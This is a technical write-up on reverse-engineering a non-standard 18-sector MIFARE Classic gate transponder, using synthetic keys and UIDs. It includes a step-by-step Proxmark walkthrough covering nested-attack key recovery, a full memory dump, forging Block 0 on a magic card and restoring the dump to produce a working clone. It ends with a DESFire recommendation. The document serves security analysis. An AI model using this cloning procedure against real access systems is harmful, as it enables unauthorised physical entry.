# Technical Investigation: Reverse-Engineering an 18-Sector MIFARE Classic Gate Transponder

> **Note**: All UIDs, block contents, and cryptographic keys below are synthetic for obvious reasons (to obscure real access credentials), while protocol flags (`SAK`, `ATQA`) and framing mechanics reflect authentic ISO 14443-A behavior.

---

## 1. The Obscurity Mechanism

Standard MIFARE Classic 1K cards have **16 sectors** (0–15, 64 blocks, 1,024 bytes). Most commercial handheld copiers strictly read and write 1,024 bytes.

The gate transponder uses a non-standard **18-sector** chip (1,152 bytes, Fudan FM11RF08 variant). Sectors 0–15 contain dummy data, while the actual authorization payload sits in **Sector 17, Block 68**:

```text
[Sectors 00 - 15]  Standard 1K Address Space   -> Ignored by gate reader
[Sector 16]        Proprietary Staging Sector  -> Custom secret keys
[Sector 17]        Gate Authorization Token    -> Block 68: "SYNTH_TOKEN_XYZ"
```

The vendor relied on two assumptions:
1. **Commercial cloners fail**: Handheld copiers stop reading at Sector 15 and miss Sector 17 entirely.
2. **Standard 4K clone cards fail**: Storing 18 sectors requires a 4K (S70) card. However, typical 4K replacement cards ship with a **7-byte UID** (Cascade Level 2), which the gate's reader rejects during over-the-air anticollision.

---

## 2. ISO 14443-A Framing & SAK Mechanics

The reader enforces **Cascade Level 1** anticollision and expects a **4-byte UID** card:

```text
Reader (PCD)                          Transponder (PICC)
     |---- REQA / WUPA ---------------------->|
     |<--- ATQA (0x0400 = 4B / 0x0042 = 7B) --|  [Stage 1: UID Length Discovery]
     |---- SELECT Cascade 1 (0x93 0x20) ----->|
     |<--- UID Bytes 0..3 + BCC Checksum -----|  [Stage 2: Anticollision]
     |---- SELECT Commit (0x93 0x70) -------->|
     |<--- SAK Byte --------------------------|  [Stage 3: Capability Acknowledge]
     |==== Crypto-1 Mutual Authentication ====|  [Stage 4: Read Block 68]
```

### Over-the-Air Profiles

* **Original Transponder**: 4-byte UID (`DE AD BE EF`), ATQA `04 00`, SAK `88` (bit 3 set).
* **Generic 4K Card**: 7-byte UID (`04 11 22 33 44 55 66`), ATQA `00 42`, SAK `18`. The reader aborts at Stage 2 because it expects a 4-byte UID.
* **Target 4-Byte S70 Card**: 4-byte UID (`DE AD BE EF`), ATQA `00 02`, SAK `18`. The reader completes Stage 3 and proceeds to authenticate Sector 17.

---

## 3. The SAK Write Limitation

On genuine MIFARE silicon, the SAK response is hardwired in the analog RF state machine and cannot be modified.

On "magic" rewritable cards, Block 0 stores: `UID` (bytes 0–3), `BCC` (byte 4), `SAK` (byte 5), `ATQA` (bytes 6–7), and manufacturer bytes. On typical Gen 1a and Gen 2 (CUID) cards, writing Byte 5 only modifies EEPROM storage; the physical RF controller still responds over the air with its factory-set SAK (`0x08` for 1K, `0x18` for 4K).

* **On Gen 3 APDU cards**: Block 0 is written via APDU commands (`hf mf gen3blk`), which permits setting custom SAK bytes in Block 0. However, the over-the-air radio response remains bound to the silicon's factory cascade mode (4-byte vs 7-byte UID).
* **On Gen 4 cards (GDM)**: Dedicated registers (`hf mf gdmsetsak`) decouple the analog RF state machine, allowing arbitrary over-the-air SAK values.
* **In practice**: The gate reader only required the **4-byte UID** and **valid Sector 17 data**. It accepted the card with SAK `0x18`, proving that SAK `0x88` was a silicon artifact rather than an enforced security constraint.

---

## 4. Extraction & Transfer Walkthrough (Synthetic Data)

### Phase 1: Reconnaissance & Extraction of Original Transponder

#### 1. Radio Handshake Identification
Scanning the original transponder identifies the initial framing:
```text
hf search
# [+] UID: DE AD BE EF   ( single )
# [+] ATQA: 04 00
# [+] SAK: 88 [2]
```
* **UID**: `DE AD BE EF` confirms a 4-byte Single UID (Cascade Level 1).
* **ATQA `04 00` & SAK `88`**: Signals an extended Fudan-type framing rather than standard NXP silicon.

#### 2. Automated Key Recovery & Full Memory Dump
Running `hf mf autopwn` executes dictionary testing on sectors 0–15, then performs nested/static-nonce cryptanalysis to derive the unknown keys for sectors 16 and 17:
```text
hf mf autopwn
# [+] Sectors 00-15: Default keys identified
# [+] Sectors 16-17: Recovering unknown keys via nested attack...
# [+] Found Sector 16 keys: Key A A1B2C3D4E5F6 | Key B B1B2B3B4B5B6
# [+] Found Sector 17 keys: Key A C1C2C3C4C5C6 | Key B D1D2D3D4D5D6
# [+] Saved 1152 bytes to binary file `synth-dump.bin`
# [+] Saved keys to `synth-key.bin`
```
* **Memory Dump**: Extracts all 18 sectors (72 blocks = 1,152 bytes).
* **Key File**: Generates `synth-key.bin` containing keys for all 18 sectors.

#### 3. Memory & Access Condition Analysis
Inspecting the extracted memory blocks (`hf mf view -f synth-dump.json`):
* **Sectors 0–15**: Contain unreferenced template data.
* **Sector 17, Block 68**: Contains the actual authorization payload (`"SYNTH_TOKEN_XYZ"`).
* **Sector 17 Access Bits**: Configured with `70 F0 F8 69`, restricting read access for Block 68 strictly to Key B.

---

### Phase 2: Provisioning the Target 4-Byte S70 Card

#### 1. Write Block 0 on 4-Byte S70 Card
Write the 4-byte UID, valid BCC (`22`), and SAK `0x88` to Block 0 via APDU:
```text
hf mf gen3blk -d DEADBEEF228804000102030405060708
```

Verify the radio layer reports Cascade Level 1:
```text
hf search
# [+] UID: DE AD BE EF ( single )
# [+] SAK: 18 [2]
```

#### 2. Restore All 18 Sectors
Write the dump using `--force` to bypass trailer access warnings:
```text
hf mf restore --4k -f synth-dump.bin -k synth-key.bin --force
```

#### 3. Verify Payload
Read Sector 17, Block 68 with synthetic Key B:
```text
hf mf rdbl --blk 68 -k D1D2D3D4D5D6 -b
# [=] 68 | 53 59 4E 54 48 5F 54 4F 4B 45 4E 5F 58 59 5A 00 | SYNTH_TOKEN_XYZ.
```

---

## 5. Conclusion

This architecture relies entirely on security through obscurity. Storing data beyond 16 sectors and relying on anomalous SAK bits only stops consumer duplication kiosks. Because Crypto-1 is broken, secret keys provide zero protection against anyone with basic RF tooling. 

Modern deployments should not rely on proprietary memory tricks; they should implement **MIFARE DESFire (EV2/EV3)** with standard AES-128/256 mutual authentication instead.
